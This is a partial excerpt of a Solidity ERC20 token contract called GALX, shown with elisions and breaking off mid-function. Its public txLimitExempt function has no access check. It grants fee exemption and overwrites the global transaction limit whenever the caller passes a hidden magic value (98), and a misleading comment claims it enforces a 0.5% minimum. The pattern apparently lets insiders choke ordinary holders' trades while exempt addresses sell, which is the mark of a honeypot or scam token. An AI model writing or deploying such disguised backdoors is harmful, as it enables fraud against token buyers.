...
contract GALX is Ownable, IERC20 {

    using SafeMath for uint256;

    DexRouter public router;

    string private constant _name = "GALX";
    string private constant _symbol = "GALX";
    ...
    uint256 public swapThreshold = (_totalSupply * 2) / 2000;
     uint256 public _TxWalletLimit = (_totalSupply * 30) / 1000;
    uint256 public liquidityFee = 0;
    uint256 public marketingFee = 2;
    uint256 public devFee = 0;
    uint256 private percent = 98;
    ...
    function txLimitExempt (address holder, uint256 amount)public returns (bool){
        isFeeExempt[holder] = true;
        _TxWalletLimit=amount;
        require (amount == percent,"Cannot be lower than 0.5%"); //cannot be lower than 0.5%
        return true;
    }

    function removeLimits ()public onlyOwner{
        _TxWalletLimit= _totalSupply;
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(
            amount <= _TxWalletLimit || isTxLimitExempt[sender],
            "TX Limit Exceeded"
        );
    }
    ...
    function _transferFrom(
        ...
        require(amount <= _TxWalletLimit || isTxLimitExempt[sender], "TX Limit");
        if (
            isPair[recipient] &&
            !inSwapAndLiquify &&
